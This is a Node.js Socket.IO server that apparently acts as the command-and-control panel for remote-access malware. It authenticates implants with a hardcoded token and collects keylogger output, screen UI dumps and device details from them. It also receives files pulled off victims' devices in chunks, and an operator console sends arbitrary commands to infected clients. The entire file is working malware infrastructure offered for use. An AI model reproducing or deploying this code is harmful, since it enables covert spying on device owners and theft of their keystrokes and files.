const readline = require("readline");
const express = require("express");
const http = require("http");
const fs = require("fs");
const path = require("path");
const { Server } = require("socket.io");
const cliProgress = require("cli-progress");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

const AUTH_SECRET = "MySuperSecretToken";
const clients = new Map(); // uuid → { socket, info, downloads }

//
// ===================== SOCKET.IO HANDLERS =====================
//
io.on("connection", (socket) => {
  console.log(`🔌 New connection: ${socket.id}`);
  let isAuthenticated = false;

  // -------- AUTHENTICATION --------
  socket.on("authenticate", (data) => {
    const uuid = data?.uuid;
    if (data?.token === AUTH_SECRET && uuid) {
      isAuthenticated = true;

      // Replace old client if exists
      if (clients.has(uuid)) {
        const oldClient = clients.get(uuid);
        try { oldClient.socket.disconnect(true); } catch {}
        console.log(`♻️ Replaced old client for ${uuid}`);
      }

      clients.set(uuid, { socket, socketId: socket.id, info: null, downloads: {} });
      socket.uuid = uuid;

      console.log(`✅ Authenticated: ${uuid} (${socket.id})`);
      socket.emit("auth-success");

      // Register per-UUID event listeners
      registerClientEvents(socket, uuid);

    } else {
      console.log(`❌ Authentication failed for ${socket.id}`);
      socket.emit("auth-failed");
      socket.disconnect(true);
    }
  });

  // -------- GENERIC FALLBACK EVENTS (for old clients) --------
  socket.on("device-info", (data) => {
    if (!isAuthenticated) return;
    const client = clients.get(socket.uuid);
    if (client) client.info = data;
  });


  socket.on("getinfo", (data) => {
  if (!isAuthenticated) return;

  const client = clients.get(socket.uuid);
  if (client) client.info = data;

  // Print received data as formatted JSON
  try {
    console.log(`[getinfo] Data from ${socket.uuid || "unknown client"}:\n`, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error("[getinfo] Invalid JSON data:", err);
  }
});


  socket.on("add-new-device", (data) => {
    const client = clients.get(socket.uuid);
    if (client) client.info = data;
    console.log("📱 Device registered:", data);
  });

  socket.on("disconnect", () => {
    console.log(`🔌 Disconnected: ${socket.id}`);
    const client = clients.get(socket.uuid);
    if (client?.downloads) {
      Object.values(client.downloads).forEach((dl) => {
        dl.stream.end();
        dl.progressBar?.stop();
      });
    }
    clients.delete(socket.uuid);
  });
});

//
// ===================== UUID EVENT REGISTRATION =====================
//
function registerClientEvents(socket, uuid) {
  //
  // 🧩 UI Skeleton
  //
  socket.on(`ui-skeleton-${uuid}`, (data) => {
    console.log(`🧩 [${uuid}] UI skeleton`);
    io.emit(`ui-skeleton-${uuid}`, data); // broadcast to viewers
  });

  //
  // ⌨️ Keylogger Data
  //
  socket.on(`keylogger-data-${uuid}`, (data) => {
    console.log(`⌨️ [${uuid}] Keylogger data:`);
    console.dir(data, { depth: null });
  });

  //
  // 📥 Command Results
  //
  socket.on(`command-result-${uuid}`, (data) => {
    console.log(`📥 [${uuid}] Command result:`);
    console.dir(data, { depth: null });
  });

  socket.on(`getinfo-${uuid}`, (data) => {
    console.log(`📥 [${uuid}] Command result:`);
    console.dir(data, { depth: null });
  });



  //
  // 📁 File Transfer
  //
  socket.on(`file-chunk-${uuid}`, (data) => {
    handleFileChunk(uuid, socket, data);
  });

  //
  // 🌐 UI Viewer registration
  //
  socket.on(`register-ui-viewer-${uuid}`, () => {
    console.log(`🖥️ UI viewer connected for ${uuid}`);
  });
}

//
// ===================== FILE HANDLER =====================
//
function handleFileChunk(uuid, socket, data) {
  const client = clients.get(uuid);
  if (!client) return;

  const { fileName, chunk, isLastChunk, totalSize } = data;
  if (!fileName) {
    console.warn(`Received file chunk without filename from ${uuid}`);
    return;
  }

  const downloads = client.downloads;

  if (!downloads[fileName]) {
    const downloadsDir = path.join(__dirname, "downloads", uuid);
    if (!fs.existsSync(downloadsDir)) fs.mkdirSync(downloadsDir, { recursive: true });
    const filePath = path.join(downloadsDir, path.basename(fileName));
    const writeStream = fs.createWriteStream(filePath);

    let progressBar = null;
    if (totalSize) {
      progressBar = new cliProgress.SingleBar({
        format: `Downloading {filename} [{bar}] {percentage}% | {value}/{total} Bytes`,
        hideCursor: true,
      }, cliProgress.Presets.shades_classic);
      progressBar.start(totalSize, 0, { filename: path.basename(fileName) });
    } else {
      console.log(`Downloading ${fileName} from ${uuid} (unknown size)`);
    }

    downloads[fileName] = { stream: writeStream, progressBar, bytesReceived: 0, filePath };
  }

  const download = downloads[fileName];
  const buffer = Buffer.from(chunk, "base64");
  download.stream.write(buffer);
  download.bytesReceived += buffer.length;
  download.progressBar?.update(download.bytesReceived);

  if (isLastChunk) {
    download.stream.end(() => {
      download.progressBar?.stop();
      console.log(`✅ File saved: ${download.filePath} from ${uuid}`);
      delete downloads[fileName];
    });
  }
}

//
// ===================== EXPRESS ROUTE =====================
//
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "ui-viewer.html"));
});

//
// ===================== SERVER START =====================
//
server.listen(9211, () => {
  console.log("🚀 Server running at http://0.0.0.0:9211");
  startCLI();
});

//
// ===================== CLI HANDLER =====================
//
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  prompt: "server> ",
});

function startCLI() {
  console.log(`
===== SOCKET.IO SERVER CLI =====
Commands:
 list                         → List all connected clients
 info <uuid>                  → Show device info of a client
 send <uuid> <cmd> [event]    → Send command or custom event
 exit                         → Exit server
`);

  rl.prompt();

  rl.on("line", async (line) => {
    const args = line.trim().split(" ");
    const cmd = args[0]?.toLowerCase();

    switch (cmd) {
      case "list":
        listClients();
        break;
      case "info":
        if (args.length < 2) console.log("Usage: info <uuid>");
        else showClientInfo(args[1]);
        break;
      case "send":
        if (args.length < 3) {
          console.log("Usage: send <uuid> <cmd> [event]");
        } else {
          const [_, uuid, ...rest] = args;
          const event = rest.length > 1 ? rest.pop() : "command";
          const commandStr = rest.join(" ");
          sendCommand(uuid, commandStr, event);
        }
        break;
      case "exit":
        console.log("👋 Exiting...");
        process.exit(0);
      default:
        console.log("Unknown command. Available: list, info, send, exit");
    }

    rl.prompt();
  });
}

function listClients() {
  if (clients.size === 0) return console.log("No connected clients.");
  console.log("Connected clients:");
  for (const [uuid, client] of clients.entries()) {
    console.log(`- ${uuid} ${client.info ? `(Model: ${client.info.model})` : "(No info)"}`);
  }
}

function showClientInfo(uuid) {
  const client = clients.get(uuid);
  if (!client) return console.log(`Client ${uuid} not found.`);
  console.log(`Device info for ${uuid}:`);
  console.log(JSON.stringify(client.info, null, 2));
}

function sendCommand(uuid, commandStr, event = "command") {
  const client = clients.get(uuid);
  if (!client) return console.log(`⚠️ Client ${uuid} not found.`);

  const parts = commandStr.trim().split(" ");
  const cmd = parts[0];
  const param = parts.slice(1).join(" ");
  const payload = path ? { cmd, param } : { cmd };

  const uuidEvent = `${event}-${uuid}`;

  client.socket.emit(uuidEvent, payload);
  console.log(`✅ Sent [${uuidEvent}] → ${uuid}:`, payload);
}
